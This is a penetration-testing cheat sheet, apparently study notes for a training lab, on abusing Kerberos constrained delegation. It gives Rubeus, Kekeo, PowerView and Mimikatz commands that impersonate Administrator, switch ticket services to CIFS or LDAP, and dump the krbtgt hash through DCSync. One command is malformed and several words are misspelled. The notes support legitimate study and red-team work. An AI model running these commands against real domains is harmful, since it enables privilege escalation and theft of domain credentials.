## General Info

If a frontend service does not use Kerberos authentication and the backend service does, it needs to be able to request a TGS to the frontend service from a KDC on behalf of the user who is authenticating against it. The S4U2Self extension enables this if the TRUSTED_TO_AUTH_FOR_DELEGATION value is present in the useraccountcontrol property.
Additionally, the frontend service can do this without requiring the password or the hash of the
user.

Similar to S4U2Self, the S4U2proxy extension requests a service ticket for the backend service on
behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or
directly from a user authentication via Kerberos.

## Find Servers that has constrained delegation
```powershell
#PowerView
Get-DomainUser -TrustedToAuth
```

#Check if "TRUSTED_TO_AUTH_FOR_DELEGATION" is set and check the "msds-allowedtodelegateto" SIDS to know the SID's the account (samaccountname) can delegate to.

## Using Rubeus to request a TGS on behalf of a specific user

```powershell
#Get the hash for the account we want to use for requesting a ticket on behalf of the user when we do have a clear-text password we can convert it to a hex:
.\Rubeus.exe hash /password:lab

#Now let's use the hash to start with the asktgt command to generate a TGT for IISSvc service:
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

#Now we have the Base64-encoded TGT for IISSvc we can use the S4U extensions to impersonate a random username and request a ticket to another service. We also need the service we are requesting the ticket for. We imidiatly inject the requested ticket to our process with the /ptt flag:
.\Rubeus.exe s4u /ticket:%TICKETNAME% /impersonateuser:%Username-to-impersonate /msdsspn:mssqlsvc/dc01.prod.corp1.com:1433 /ptt
```

## Use Rubeus to change the service

When the above action is performed we can use Rubeus to change the servicename of the ticket as long as the service is active on the same server.

```powershell
.\Rubeus.exe s4u /ticket:%TICKETNAME% /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
```

## Using Kekeo to Requst TGT

```powershell
.\kekeo.exe

tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

## Use TGT to get TGS

```powershell
tgs::s4u

tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs /dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

## Inject Ticket in Current Session

```powershell
. ..\Invoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

---

## Using Rubeus to get TGS

```powershell
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

---

## Enum Computers with contrained Delegation

```powershell
. .\PowerView_dev.ps1

Get-DomainComputer -TrustedToAuth
```

## Request TGT

```powershell
.\kekeo.exe

tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
```

## Request TGS

```powershell
tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

## Using this TGS to Do DYSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Abuse Contrained Delegation with Rebeus

```powershell
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:8c6264140d5ae7d03f7f2a53088a291d/impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
```

## DCSync Attack

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

```

## Other Resources

[Kerberos Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

[Constrained Delegation Abuse: Abusing Constrained Delegation to Achieve Elevated Access | Stealthbits Technologies](https://stealthbits.com/blog/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/)
